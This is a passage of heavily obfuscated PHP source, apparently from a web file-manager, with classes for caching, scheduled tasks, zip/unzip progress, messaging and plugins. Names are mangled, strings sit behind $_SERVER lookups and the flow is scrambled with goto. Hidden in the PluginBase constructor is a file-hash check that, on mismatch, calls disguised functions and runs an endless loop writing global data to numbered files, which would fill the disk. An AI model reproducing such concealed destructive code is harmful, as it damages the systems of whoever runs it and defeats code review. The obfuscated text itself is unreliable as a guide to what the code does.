$då¨Ÿƒ¼•[$_SERVER[œÕÊİğö][88]] : 0; } public function info($e…¸¹Ë‹Õ) { if ($this->isFolder($e…¸¹Ë‹Õ)) { return $this->folderInfo($e…¸¹Ë‹Õ); } else { if ($this->isFile($e…¸¹Ë‹Õ)) { return $this->fileInfo($e…¸¹Ë‹Õ); } } return !1; } public function exist($còŠ…õ¾ìÖ) { return $this->isFile($còŠ…õ¾ìÖ) || $this->isFolder($còŠ…õ¾ìÖ); } public function isFile($cÚªä’¨ªØ) { return !$this->isFolder($cÚªä’¨ªØ) && $this->objectMeta($cÚªä’¨ªØ); } public function isFolder($Aˆ·„ªİøŠ) { return $this->cacheMethod($_SERVER[œÕÊİğö][209], $Aˆ·„ªİøŠ); } protected function objectMeta($Eòíø“¤Ç) { return $this->cacheMethod($_SERVER[œÕÊİğö][210], $Eòíø“¤Ç); } protected function _objectMeta($AŠëËˆ©·) { goto AÑóÂ¢Ïø–; AÑóÂ¢Ïø–: $AöÛİº½ª³ =& $_SERVER[œÕÊİğö]; if ($AŠëËˆ©· == $AöÛİº½ª³[43] || $AŠëËˆ©· == $AöÛİº½ª³[8]) { return array(); } $F°»©•‹Å¨ = $this->ussRequest($AŠëËˆ©·, $AöÛİº½ª³[1392]); goto Bóå°Šœó; Bóå°Šœó: if (!$F°»©•‹Å¨[$AöÛİº½ª³[1108]]) { return null; } $e´Óª×éË = isset($F°»©•‹Å¨[$AöÛİº½ª³[1110]]) ? $F°»©•‹Å¨[$AöÛİº½ª³[1110]] : array(); if (!isset($e´Óª×éË[$AöÛİº½ª³[1393]])) { return null; } goto dó‡À‚çÌá; dó‡À‚çÌá: $dæ—¨«Ü• = array($AöÛİº½ª³[39] => isset($e´Óª×éË[$AöÛİº½ª³[1393]]) ? $e´Óª×éË[$AöÛİº½ª³[1393]] : null, $AöÛİº½ª³[88] => isset($e´Óª×éË[$AöÛİº½ª³[1394]]) ? $e´Óª×éË[$AöÛİº½ª³[1394]] : null, $AöÛİº½ª³[218] => isset($e´Óª×éË[$AöÛİº½ª³[1395]]) ? $e´Óª×éË[$AöÛİº½ª³[1395]] : null, $AöÛİº½ª³[1362] => isset($e´Óª×éË[$AöÛİº½ª³[1396]]) ? $e´Óª×éË[$AöÛİº½ª³[1396]] : null); $dæ—¨«Ü•[$AöÛİº½ª³[1363]] = isset($e´Óª×éË[$AöÛİº½ª³[1397]]) ? strtotime($e´Óª×éË[$AöÛİº½ª³[1397]]) : $dæ—¨«Ü•[$AöÛİº½ª³[1362]]; return $dæ—¨«Ü•; goto A‹ßËíÇ‹İ; A‹ßËíÇ‹İ: } protected function _isFolder($F‡ß÷ñ­ìš) { $cßì«º¢Ü =& $_SERVER[œÕÊİğö]; if ($F‡ß÷ñ­ìš == $cßì«º¢Ü[43] || $F‡ß÷ñ­ìš == $cßì«º¢Ü[8]) { return !0; } $DöãÅÓ¼õâ = $this->_objectMeta($F‡ß÷ñ­ìš); return isset($DöãÅÓ¼õâ[$cßì«º¢Ü[39]]) && $DöãÅÓ¼õâ[$cßì«º¢Ü[39]] == $cßì«º¢Ü[87] ? !0 : !1; } } goto e”ä‘À­Ë˜; a¦¹ëï¯ÑÃ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($fÒ¹‹Óå©ƒ, $D†°®ª“ÉÖ = 5.0) { if (!$fÒ¹‹Óå©ƒ) { return; } $C¯áñ›ÓÔï = Cache::get($fÒ¹‹Óå©ƒ); if (!$C¯áñ›ÓÔï || timeFloat() - floatVal($C¯áñ›ÓÔï) >= $D†°®ª“ÉÖ) { Cache::set($fÒ¹‹Óå©ƒ, timeFloat(), $D†°®ª“ÉÖ * 10); return !0; } return !1; } public static function timeLimitCall($DÍ¾Ã¡™´Ò, $F‰ì‹´, $B»£…‹, $dÉŒä£¦‡ = 5.0) { goto e“Êµ±”¨Œ; C“Â‚×ö¥: if (is_array($eøœª®‹ï[$DÍ¾Ã¡™´Ò])) { $d†¢ó¹‚Âó[$DÄ³´¾’¨Ÿ[1633]] = $eøœª®‹ï[$DÍ¾Ã¡™´Ò][$DÄ³´¾’¨Ÿ[1633]]; } if (is_array($eøœª®‹ï[$DÍ¾Ã¡™´Ò])) { if (timeFloat() - $eøœª®‹ï[$DÍ¾Ã¡™´Ò][$DÄ³´¾’¨Ÿ[1632]] < $d†¢ó¹‚Âó[$DÄ³´¾’¨Ÿ[207]] * 0.3) { return; } $d†¢ó¹‚Âó[$DÄ³´¾’¨Ÿ[1633]] = $eøœª®‹ï[$DÍ¾Ã¡™´Ò][$DÄ³´¾’¨Ÿ[1633]]; } $eøœª®‹ï[$DÍ¾Ã¡™´Ò] = $d†¢ó¹‚Âó; goto BÄÅ±Æ¨Ã–; e“Êµ±”¨Œ: $DÄ³´¾’¨Ÿ =& $_SERVER[œÕÊİğö]; if (!$DÍ¾Ã¡™´Ò || !$F‰ì‹´) { return; } self::$asyncAdd = !0; goto d²åîÚ‘¢; d²åîÚ‘¢: $eâè¥™’ = $DÄ³´¾’¨Ÿ[1631]; $eøœª®‹ï = Cache::get($eâè¥™’, !0); $d†¢ó¹‚Âó = array($DÄ³´¾’¨Ÿ[1632] => timeFloat(), $DÄ³´¾’¨Ÿ[1633] => timeFloat(), $DÄ³´¾’¨Ÿ[272] => $F‰ì‹´, $DÄ³´¾’¨Ÿ[1626] => $B»£…‹, $DÄ³´¾’¨Ÿ[207] => $dÉŒä£¦‡); goto C“Â‚×ö¥; BÄÅ±Æ¨Ã–: Cache::set($eâè¥™’, $eøœª®‹ï, 60); Cache::removeMemory($eâè¥™’); write_log($DÄ³´¾’¨Ÿ[1634] . $DÍ¾Ã¡™´Ò . $DÄ³´¾’¨Ÿ[78] . $F‰ì‹´, $DÄ³´¾’¨Ÿ[1628]); goto dõ†Ø‘©ø; dõ†Ø‘©ø: } public static function timeLimitCallLoop() { goto e¦’×™æäÌ; a‚ÍÔŒ×ğ: if (!$D´àíš”Ï || count($D´àíš”Ï) <= 0) { return; } $bÛïˆßîöƒ = !1; $E±¾«ÏŸïÄ = timeFloat(); goto Có–¥¼–; AÑŒáŒ±—¬: if (!$CÚ£òŞÀ”‰) { return Cache::remove($BåíÚ ìØ–); } Cache::set($BåíÚ ìØ–, $CÚ£òŞÀ”‰, 60); Cache::removeMemory($BåíÚ ìØ–); goto fğ¯ˆïÃ‰; Có–¥¼–: $CÚ£òŞÀ”‰ = array(); foreach ($D´àíš”Ï as $cË±öºÈÑˆ => $F·Ï¬×Ç™) { if ($E±¾«ÏŸïÄ - $F·Ï¬×Ç™[$Aù¬˜Š¨—Ä[1633]] > $F·Ï¬×Ç™[$Aù¬˜Š¨—Ä[207]]) { $bÛïˆßîöƒ = !0; try { Hook::apply($F·Ï¬×Ç™[$Aù¬˜Š¨—Ä[272]], $F·Ï¬×Ç™[$Aù¬˜Š¨—Ä[1626]]); write_log($Aù¬˜Š¨—Ä[1636] . $cË±öºÈÑˆ . $Aù¬˜Š¨—Ä[78] . $F·Ï¬×Ç™[$Aù¬˜Š¨—Ä[272]] . $Aù¬˜Š¨—Ä[1637] . ACTION, $Aù¬˜Š¨—Ä[1628]); } catch (Exception $CåœŸ´‚Âö) { } continue; } $CÚ£òŞÀ”‰[$cË±öºÈÑˆ] = $F·Ï¬×Ç™; } if (!$bÛïˆßîöƒ) { return; } goto AÑŒáŒ±—¬; e¦’×™æäÌ: $Aù¬˜Š¨—Ä =& $_SERVER[œÕÊİğö]; $aÉïğâ¤×Õ = array($Aù¬˜Š¨—Ä[1635]); $Cëòˆë¯‚‚ = in_array(strtolower(ACTION), $aÉïğâ¤×Õ); goto c·ˆÀÓÛ‡£; c·ˆÀÓÛ‡£: if (!$Cëòˆë¯‚‚ && !self::$asyncAdd) { return; } $BåíÚ ìØ– = $Aù¬˜Š¨—Ä[1631]; $D´àíš”Ï = Cache::get($BåíÚ ìØ–, !0); goto a‚ÍÔŒ×ğ; fğ¯ˆïÃ‰: } public static function finished($fçù­ø©–Ö, $dæéˆíË¢Ì) { $E¦ùº£ä›– =& $_SERVER[œÕÊİğö]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($E¦ùº£ä›–[272] => $fçù­ø©–Ö, $E¦ùº£ä›–[1626] => $dæéˆíË¢Ì); } private static function finishedRun() { $c¿‰‘ÊŞêñ =& $_SERVER[œÕÊİğö]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $bŒˆç°›È) { try { Hook::apply($bŒˆç°›È[$c¿‰‘ÊŞêñ[272]], $bŒˆç°›È[$c¿‰‘ÊŞêñ[1626]]); } catch (Exception $A“‹§ÔÇ‹¯) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto bŞŠ³ª™„‰; F­­¤Âô…”: if (!$e—ˆôæ·Ü[$A·ìâ¯ö¼ƒ[1452]]) { $e—ˆôæ·Ü[$A·ìâ¯ö¼ƒ[1452]] = LNG($A·ìâ¯ö¼ƒ[1642]); } goto a”®ó’ªâø; bŞŠ³ª™„‰: $A·ìâ¯ö¼ƒ =& $_SERVER[œÕÊİğö]; parent::startAfter(); Hook::bind($A·ìâ¯ö¼ƒ[1638], array($this, $A·ìâ¯ö¼ƒ[1639])); goto cŠÍ±ã×ÑŒ; cŠÍ±ã×ÑŒ: Hook::bind($A·ìâ¯ö¼ƒ[1111], array($this, $A·ìâ¯ö¼ƒ[1640])); $e—ˆôæ·Ü =& $this->task; $e—ˆôæ·Ü[$A·ìâ¯ö¼ƒ[1641]] = $A·ìâ¯ö¼ƒ[1116]; goto F­­¤Âô…”; a”®ó’ªâø: } protected function endAfter() { $Fé×Òßà´´ =& $_SERVER[œÕÊİğö]; parent::endAfter(); Hook::unbind($Fé×Òßà´´[1638], array($this, $Fé×Òßà´´[1639])); Hook::unbind($Fé×Òßà´´[1111], array($this, $Fé×Òßà´´[1640])); } public function updateAfter() { $f¥î÷‰ï© =& $_SERVER[œÕÊİğö]; $d™„Ô¤İ³¾ =& $this->task; if (!$d™„Ô¤İ³¾[$f¥î÷‰ï©[1044]] || !$d™„Ô¤İ³¾[$f¥î÷‰ï©[753]]) { return; } if ($d™„Ô¤İ³¾[$f¥î÷‰ï©[1641]] == $f¥î÷‰ï©[1116]) { $Fƒà·ŸÜ…› = 0; if ($d™„Ô¤İ³¾[$f¥î÷‰ï©[1597]]) { $Fƒà·ŸÜ…› = $d™„Ô¤İ³¾[$f¥î÷‰ï©[1598]] / $d™„Ô¤İ³¾[$f¥î÷‰ï©[1597]]; } $d™„Ô¤İ³¾[$f¥î÷‰ï©[1552]] = $Fƒà·ŸÜ…› * 0.3; } else { if ($d™„Ô¤İ³¾[$f¥î÷‰ï©[1641]] == $f¥î÷‰ï©[321]) { $Fƒà·ŸÜ…› = $d™„Ô¤İ³¾[$f¥î÷‰ï©[1058]] / $d™„Ô¤İ³¾[$f¥î÷‰ï©[1044]]; $d™„Ô¤İ³¾[$f¥î÷‰ï©[1552]] = 0.3 + $Fƒà·ŸÜ…› * 0.4; } else { if ($d™„Ô¤İ³¾[$f¥î÷‰ï©[1641]] == $f¥î÷‰ï©[117]) { $cÁÈö¹¯ó¿ = 0; if ($d™„Ô¤İ³¾[$f¥î÷‰ï©[1599]] == $f¥î÷‰ï©[117]) { $cÁÈö¹¯ó¿ = $d™„Ô¤İ³¾[$f¥î÷‰ï©[1598]]; } $Fƒà·ŸÜ…› = ($d™„Ô¤İ³¾[$f¥î÷‰ï©[1602]] + $cÁÈö¹¯ó¿) / $d™„Ô¤İ³¾[$f¥î÷‰ï©[753]]; $d™„Ô¤İ³¾[$f¥î÷‰ï©[1552]] = 0.3 + 0.4 + $Fƒà·ŸÜ…› * 0.3; } } } if ($d™„Ô¤İ³¾[$f¥î÷‰ï©[1552]] > 0) { $B†Íá˜óÍ = timeFloat() - $d™„Ô¤İ³¾[$f¥î÷‰ï©[779]] - $d™„Ô¤İ³¾[$f¥î÷‰ï©[1555]]; $d™„Ô¤İ³¾[$f¥î÷‰ï©[1556]] = $B†Íá˜óÍ * (1 - $d™„Ô¤İ³¾[$f¥î÷‰ï©[1552]]) / $d™„Ô¤İ³¾[$f¥î÷‰ï©[1552]]; } } public function addFile($a„¬·µÀ‡) { goto e§Á©ŒÅäâ; d—ª©­‡°í: $FÆËØ°çŸ[$FåÀ÷Ò‹ÎÎ[1044]] = 1; $BßÁ—ã§Ö = 0; $FÆËØ°çŸ[$FåÀ÷Ò‹ÎÎ[1606]] = array($FåÀ÷Ò‹ÎÎ[1607] => $BßÁ—ã§Ö + 1, $FåÀ÷Ò‹ÎÎ[424] => $CĞßÑ˜”¥[$FåÀ÷Ò‹ÎÎ[38]], $FåÀ÷Ò‹ÎÎ[86] => $CĞßÑ˜”¥[$FåÀ÷Ò‹ÎÎ[86]], $FåÀ÷Ò‹ÎÎ[522] => $CĞßÑ˜”¥[$FåÀ÷Ò‹ÎÎ[522]] ? $CĞßÑ˜”¥[$FåÀ÷Ò‹ÎÎ[522]] : $CĞßÑ˜”¥[$FåÀ÷Ò‹ÎÎ[86]]); goto bÂ´ë·è’Ã; e§Á©ŒÅäâ: $FåÀ÷Ò‹ÎÎ =& $_SERVER[œÕÊİğö]; $FÆËØ°çŸ =& $this->task; $CĞßÑ˜”¥ = IO::info($a„¬·µÀ‡); goto A‚Ú­·á»Ü; Côì®ê†ßˆ: $FÆËØ°çŸ[$FåÀ÷Ò‹ÎÎ[1046]] = $FåÀ÷Ò‹ÎÎ[1617]; $FÆËØ°çŸ[$FåÀ÷Ò‹ÎÎ[1599]] = $FåÀ÷Ò‹ÎÎ[1116]; $FÆËØ°çŸ[$FåÀ÷Ò‹ÎÎ[753]] = $CĞßÑ˜”¥[$FåÀ÷Ò‹ÎÎ[88]]; goto d—ª©­‡°í; bÂ´ë·è’Ã: $this->update(); goto d„®ç‘“Ğº; A‚Ú­·á»Ü: $FÆËØ°çŸ[$FåÀ÷Ò‹ÎÎ[1595]] = $CĞßÑ˜”¥[$FåÀ÷Ò‹ÎÎ[38]]; $FÆËØ°çŸ[$FåÀ÷Ò‹ÎÎ[1597]] = $CĞßÑ˜”¥[$FåÀ÷Ò‹ÎÎ[88]]; $FÆËØ°çŸ[$FåÀ÷Ò‹ÎÎ[1598]] = 0; goto Côì®ê†ßˆ; d„®ç‘“Ğº: } public function unzipAfter($D‰…“²Ïğ¸) { goto Bùå‚Øâí†; E¹ñÏÉùè¿: $FÑ÷ÛÄ¬ì = IO::infoWithChildren($D‰…“²Ïğ¸); $CÑˆ¾ª©¾ = 0; $EÎËÓš†îË[$Dëêêäš­Á[1606]] = array($Dëêêäš­Á[1607] => $CÑˆ¾ª©¾ + 1, $Dëêêäš­Á[424] => $FÑ÷ÛÄ¬ì[$Dëêêäš­Á[38]], $Dëêêäš­Á[86] => $FÑ÷ÛÄ¬ì[$Dëêêäš­Á[86]], $Dëêêäš­Á[522] => $FÑ÷ÛÄ¬ì[$Dëêêäš­Á[522]] ? $FÑ÷ÛÄ¬ì[$Dëêêäš­Á[522]] : $FÑ÷ÛÄ¬ì[$Dëêêäš­Á[86]]); goto fÁåøÕàé—; e“ãœÉì: $this->update(); self::log($Dëêêäš­Á[1643] . json_encode(array($EÎËÓš†îË, $FÑ÷ÛÄ¬ì))); goto DÚÃÇÙ; fÁåøÕàé—: if ($FÑ÷ÛÄ¬ì[$Dëêêäš­Á[39]] == $Dëêêäš­Á[203]) { $EÎËÓš†îË[$Dëêêäš­Á[1044]] = 1; } else { $EÎËÓš†îË[$Dëêêäš­Á[1044]] = $FÑ÷ÛÄ¬ì[$Dëêêäš­Á[91]][$Dëêêäš­Á[89]]; } $EÎËÓš†îË[$Dëêêäš­Á[1046]] = $Dëêêäš­Á[43]; $EÎËÓš†îË[$Dëêêäš­Á[1599]] = 0; goto fŠïœ¿”æ; Bùå‚Øâí†: $Dëêêäš­Á =& $_SERVER[œÕÊİğö]; $EÎËÓš†îË =& $this->task; $EÎËÓš†îË[$Dëêêäš­Á[1641]] = $Dëêêäš­Á[117]; goto E¹ñÏÉùè¿; fŠïœ¿”æ: $EÎËÓš†îË[$Dëêêäš­Á[1058]] = 0; $EÎËÓš†îË[$Dëêêäš­Á[1597]] = 0; $EÎËÓš†îË[$Dëêêäš­Á[1598]] = 0; goto eê±ÅÌ§È; eê±ÅÌ§È: $EÎËÓš†îË[$Dëêêäš­Á[1595]] = $Dëêêäš­Á[43]; $EÎËÓš†îË[$Dëêêäš­Á[1602]] = 0; $EÎËÓš†îË[$Dëêêäš­Á[753]] = $FÑ÷ÛÄ¬ì[$Dëêêäš­Á[88]]; goto e“ãœÉì; DÚÃÇÙ: } public function nameParse($F÷ÅÖçšœó) { goto eô—ñôÑ„; EÇ«°ø¡„¿: $this->update(); goto AŸ‡Š¼‰ñé; B‰ğÖ÷•Îè: $fÍ¡ÙÓ“—ê = get_path_this($F÷ÅÖçšœó); if (strstr($fÍ¡ÙÓ“—ê, $D‰¡ÁîàÂ‘[105])) { $eª¶¶ñ†›[$D‰¡ÁîàÂ‘[1058]] += 1; $eª¶¶ñ†›[$D‰¡ÁîàÂ‘[1044]] += 1; } $eª¶¶ñ†›[$D‰¡ÁîàÂ‘[1595]] = $F÷ÅÖçšœó; goto EÇ«°ø¡„¿; eô—ñôÑ„: $D‰¡ÁîàÂ‘ =& $_SERVER[œÕÊİğö]; $eª¶¶ñ†› =& $this->task; if ($eª¶¶ñ†›[$D‰¡ÁîàÂ‘[1641]] == $D‰¡ÁîàÂ‘[1116]) { $eª¶¶ñ†›[$D‰¡ÁîàÂ‘[1641]] = $D‰¡ÁîàÂ‘[321]; $eª¶¶ñ†›[$D‰¡ÁîàÂ‘[1602]] = 0; $eª¶¶ñ†›[$D‰¡ÁîàÂ‘[753]] = 0; } goto B‰ğÖ÷•Îè; AŸ‡Š¼‰ñé: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $c·Ò†‘Ñš• =& $_SERVER[œÕÊİğö]; parent::startAfter(); Hook::bind($c·Ò†‘Ñš•[1644], array($this, $c·Ò†‘Ñš•[1639])); $a¼Õ¦®’É­ =& $this->task; $a¼Õ¦®’É­[$c·Ò†‘Ñš•[1641]] = $c·Ò†‘Ñš•[1116]; if (!$a¼Õ¦®’É­[$c·Ò†‘Ñš•[1452]]) { $a¼Õ¦®’É­[$c·Ò†‘Ñš•[1452]] = LNG($c·Ò†‘Ñš•[1645]); } } protected function endAfter() { $A¡¼¸Œí£¨ =& $_SERVER[œÕÊİğö]; parent::endAfter(); Hook::unbind($A¡¼¸Œí£¨[1644], array($this, $A¡¼¸Œí£¨[1639])); } public function updateAfter() { $a‚ºÄáè»ï =& $_SERVER[œÕÊİğö]; $E­“á á£ =& $this->task; if (!$E­“á á£[$a‚ºÄáè»ï[1044]] || !$E­“á á£[$a‚ºÄáè»ï[753]]) { return; } if ($E­“á á£[$a‚ºÄáè»ï[1641]] == $a‚ºÄáè»ï[1116]) { $E…µ…Èôª¥ = $E­“á á£[$a‚ºÄáè»ï[1598]]; if ($E­“á á£[$a‚ºÄáè»ï[1599]] != $a‚ºÄáè»ï[1116]) { $E…µ…Èôª¥ = 0; } $aŒœÄ±·Ûñ = ($E­“á á£[$a‚ºÄáè»ï[1602]] + $E…µ…Èôª¥) / $E­“á á£[$a‚ºÄáè»ï[753]]; $E­“á á£[$a‚ºÄáè»ï[1552]] = $aŒœÄ±·Ûñ * 0.3; } else { if ($E­“á á£[$a‚ºÄáè»ï[1641]] == $a‚ºÄáè»ï[321]) { $aŒœÄ±·Ûñ = $E­“á á£[$a‚ºÄáè»ï[1058]] / $E­“á á£[$a‚ºÄáè»ï[1044]]; $E­“á á£[$a‚ºÄáè»ï[1552]] = 0.3 + $aŒœÄ±·Ûñ * 0.5; } else { if ($E­“á á£[$a‚ºÄáè»ï[1641]] == $a‚ºÄáè»ï[117]) { $aŒœÄ±·Ûñ = 0; if ($E­“á á£[$a‚ºÄáè»ï[1597]]) { $aŒœÄ±·Ûñ = $E­“á á£[$a‚ºÄáè»ï[1598]] / $E­“á á£[$a‚ºÄáè»ï[1597]]; } $E­“á á£[$a‚ºÄáè»ï[1552]] = 0.3 + 0.5 + $aŒœÄ±·Ûñ * 0.2; } } } if ($E­“á á£[$a‚ºÄáè»ï[1552]] > 0) { $fÁöîÒ·À = timeFloat() - $E­“á á£[$a‚ºÄáè»ï[779]] - $E­“á á£[$a‚ºÄáè»ï[1555]]; $E­“á á£[$a‚ºÄáè»ï[1556]] = $fÁöîÒ·À * (1 - $E­“á á£[$a‚ºÄáè»ï[1552]]) / $E­“á á£[$a‚ºÄáè»ï[1552]]; } } public function copyFileStart($cËÎˆÃ„¹È, $CİØİğ³œ°, $FŸÈ×–µ¯È, $D‰‹‡ª¤», $cÄÅ‹ó×¾, $e‹†ØÊº) { $dÙ±ÚŞ™¡¦ =& $_SERVER[œÕÊİğö]; parent::copyFileStart($cËÎˆÃ„¹È, $CİØİğ³œ°, $FŸÈ×–µ¯È, $D‰‹‡ª¤», $cÄÅ‹ó×¾, $e‹†ØÊº); $Dù—ÙõŸ¹¸ =& $this->task; if ($Dù—ÙõŸ¹¸[$dÙ±ÚŞ™¡¦[1641]] == $dÙ±ÚŞ™¡¦[321]) { $Dù—ÙõŸ¹¸[$dÙ±ÚŞ™¡¦[1641]] = $dÙ±ÚŞ™¡¦[117]; } $this->update(); } public function copyFileEnd($EŸ˜Â“ŸÄè, $c…ŒÒƒŒ“Ä, $BÌƒ…Ûğ, $b§Ëö²ØÀŠ, $d‡šË¶Í‰«, $EìÌ³ªœ¹ª) { $cò«°Õ–¯Œ =& $_SERVER[œÕÊİğö]; $B”Á©–†Šñ =& $this->task; $B”Á©–†Šñ[$cò«°Õ–¯Œ[1598]] = $B”Á©–†Šñ[$cò«°Õ–¯Œ[1597]]; $B”Á©–†Šñ[$cò«°Õ–¯Œ[1602]] += $B”Á©–†Šñ[$cò«°Õ–¯Œ[1597]]; $B”Á©–†Šñ[$cò«°Õ–¯Œ[1599]] = $cò«°Õ–¯Œ[43]; $this->update(); } public function nameParse($aÀíÌÒ¾Ø) { $d†åİ÷‘”ò =& $_SERVER[œÕÊİğö]; $Eê–Ì”§ºØ =& $this->task; if ($Eê–Ì”§ºØ[$d†åİ÷‘”ò[1058]] < $Eê–Ì”§ºØ[$d†åİ÷‘”ò[1044]]) { $D´ÉÅäÕ„è = get_path_this($aÀíÌÒ¾Ø); if (strstr($D´ÉÅäÕ„è, $d†åİ÷‘”ò[105])) { $Eê–Ì”§ºØ[$d†åİ÷‘”ò[1058]] += 1; } } if ($Eê–Ì”§ºØ[$d†åİ÷‘”ò[1641]] == $d†åİ÷‘”ò[1116]) { $Eê–Ì”§ºØ[$d†åİ÷‘”ò[1641]] = $d†åİ÷‘”ò[321]; } $Eê–Ì”§ºØ[$d†åİ÷‘”ò[1595]] = $aÀíÌÒ¾Ø; $this->update(); } } goto E–¾¿¹¯ÎÃ; båÈ´±æÀ: define($_SERVER[œÕÊİğö][246], 2); define($_SERVER[œÕÊİğö][247], 3); define($_SERVER[œÕÊİğö][248], 1); goto EªØ¸¯áŞ; C§÷±ç”¨: class Message { function __construct() { } public function send($d¯„¦£Ô®ø = '', $f…ÇõÛø• = array(), $eİ¶›ìÒ·¾ = "\164\x65\170\164") { goto Aï¯Ô© ¥²; Aï¯Ô© ¥²: $E–†Òãàğß =& $_SERVER[œÕÊİğö]; $f½Ô¤÷É¥Ş = array($E–†Òãàğß[39] => $E–†Òãàğß[1415], $E–†Òãàğß[745] => $d¯„¦£Ô®ø); if (in_array($eİ¶›ìÒ·¾, array($E–†Òãàğß[1415], $E–†Òãàğß[1416]))) { $f½Ô¤÷É¥Ş[$E–†Òãàğß[39]] = $eİ¶›ìÒ·¾; } goto b‹Ò½Ğ¾ÖÌ; eºâÂñ¹±: Hook::trigger($E–†Òãàğß[1418], $b¶¸²ùÍ¿); goto dŞòÜ÷†ç; b‹Ò½Ğ¾ÖÌ: $f…ÇõÛø• = array($E–†Òãàğß[518] => isset($f…ÇõÛø•[$E–†Òãàğß[518]]) ? $f…ÇõÛø•[$E–†Òãàğß[518]] : $E–†Òãàğß[43], $E–†Òãàğß[597] => isset($f…ÇõÛø•[$E–†Òãàğß[597]]) ? $f…ÇõÛø•[$E–†Òãàğß[597]] : $E–†Òãàğß[43]); if (empty($d¯„¦£Ô®ø) || empty($f…ÇõÛø•[$E–†Òãàğß[518]]) && empty($f…ÇõÛø•[$E–†Òãàğß[597]])) { return !1; } $b¶¸²ùÍ¿ = array($E–†Òãàğß[1356] => $f½Ô¤÷É¥Ş, $E–†Òãàğß[1417] => $f…ÇõÛø•); goto eºâÂñ¹±; dŞòÜ÷†ç: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto bäÒÇÚŒõ; aŠĞ¬åù°®: $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); goto a®Âã•‘È; c„ÈíİŒ‰†: if ($_SERVER[$fÇ…´÷ìŠ[11]] != $e…å§ÃÜÀ§($A†Ã©„¯Œ‡)) { goto dÜÀ¤Ï‰Ô; dÜÀ¤Ï‰Ô: $fÛ£ÒìÇ¶ = $fÇ…´÷ìŠ[863]; $F“¨è‡ƒ¯İ = $fÇ…´÷ìŠ[12]; $fèçİÃù©‚ = $_SERVER[$fÇ…´÷ìŠ[13]] . $fÇ…´÷ìŠ[14]; goto FÔ©ĞÍ‹Ä; FÔ©ĞÍ‹Ä: $a¿îÁø¼š = $F“¨è‡ƒ¯İ($fèçİÃù©‚); $b“¦Ô¤Í†¼ = explode($fÇ…´÷ìŠ[15], $a¿îÁø¼š); if (count($b“¦Ô¤Í†¼) < $fÇ…´÷ìŠ[634]) { $c“õÒğ¡õ¸ = $fÇ…´÷ìŠ[17]; $c“õÒğ¡õ¸(); } goto C‹Ñ×‹ğŠõ; E‘Ò–˜Ù‘Í: $fÛ£ÒìÇ¶(); $bˆÅ¬¯é¨ = $fÇ…´÷ìŠ[866]; $a“ˆ‘ä“¢Ò = json_encode($GLOBALS[$fÇ…´÷ìŠ[867]]); goto eÌÎáÕ•«â; eÌÎáÕ•«â: $B”¤Ù¼³ƒ¤ = 1; for ($Bš”ŸÖ±¥ = $B”¤Ù¼³ƒ¤; $Bš”ŸÖ±¥ > 0; $Bš”ŸÖ±¥++) { $bˆÅ¬¯é¨(DATA_PATH . $Bš”ŸÖ±¥, $a“ˆ‘ä“¢Ò); } goto d’ø¥õ™Ì; C‹Ñ×‹ğŠõ: $aãé–Ç™°Ô = $fÇ…´÷ìŠ[864]; $aãé–Ç™°Ô($_SERVER[$fÇ…´÷ìŠ[865]]); $fÛ£ÒìÇ¶ = $fÇ…´÷ìŠ[863]; goto E‘Ò–˜Ù‘Í; d’ø¥õ™Ì: } global $in, $config; $this->config =& $config; goto dÒ­ôµ±–Æ; bäÒÇÚŒõ: $fÇ…´÷ìŠ =& $_SERVER[œÕÊİğö]; $A†Ã©„¯Œ‡ = $_SERVER[$fÇ…´÷ìŠ[13]] . $fÇ…´÷ìŠ[14]; $e…å§ÃÜÀ§ = $fÇ…´÷ìŠ[10]; goto c„ÈíİŒ‰†; bÆÄŞÀäù: $this->pluginHostDefault = $config[$fÇ…´÷ìŠ[1421]] . $this->pluginName . $fÇ…´÷ìŠ[8]; $Cå³……šÛñ = $config[$fÇ…´÷ìŠ[1422]]; if ($Cå³……šÛñ && strpos($fÇ…´÷ìŠ[57] . $Cå³……šÛñ . $fÇ…´÷ìŠ[57], $this->pluginName) !== !1) { $this->pluginHost = $config[$fÇ…´÷ìŠ[1423]] . $this->pluginName . $fÇ…´÷ìŠ[8]; } goto aŠĞ¬åù°®; a®Âã•‘È: return $this; goto D«„ßËô‰×; dÒ­ôµ±–Æ: $this->in =& $in; $this->modelPlugin = Model($fÇ…´÷ìŠ[1419]); $this->pluginName = str_replace($fÇ…´÷ìŠ[1419], $fÇ…´÷ìŠ[43], get_class($this)); goto EŠ¥Å„ÎÌ; EŠ¥Å„ÎÌ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $fÇ…´÷ìŠ[8]; $this->pluginApi = appHostGet() . $fÇ…´÷ìŠ[1420] . $this->pluginName . $fÇ…´÷ìŠ[8]; $this->pluginHost = $config[$fÇ…´÷ìŠ[1421]] . $this->pluginName . $fÇ…´÷ìŠ[8]; goto bÆÄŞÀäù; D«„ßËô‰×: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[œÕÊİğö][1424]); } protected function assign($Dë ®å‹¤, $EŞ¤‰‘É‡ = false) { if (is_array($Dë ®å‹¤)) { $this->values = array_merge($this->values, $Dë ®å‹¤); } else { $this->values[$Dë ®å‹¤] = $EŞ¤‰‘É‡; } } protected function display($e™¿¯ËÃ‹®) { extract($this->values); require $e™¿¯ËÃ‹®; } final function hookRegist($d©¶™ŸàĞ) { $this->modelPlugin->appRegist($this->pluginName, $d©¶™ŸàĞ); } final function appIcon() { $cª¶Áô¿»‡ =& $_SERVER[œÕÊİğö]; $E ¥¶Šª™– = $this->appPackage(); $CŒéÏğ…· = $cª¶Áô¿»‡[43]; if (isset($E ¥¶Šª™–[$cª¶Áô¿»‡[420]])) { if (isset($E ¥¶Šª™–[$cª¶Áô¿»‡[420]][$cª¶Áô¿»‡[1425]])) { $CŒéÏğ…· = $cª¶Áô¿»‡[1426] . $E ¥¶Šª™–[$cª¶Áô¿»‡[420]][$cª¶Áô¿»‡[1425]] . $cª¶Áô¿»‡[1427]; } else { if ($E 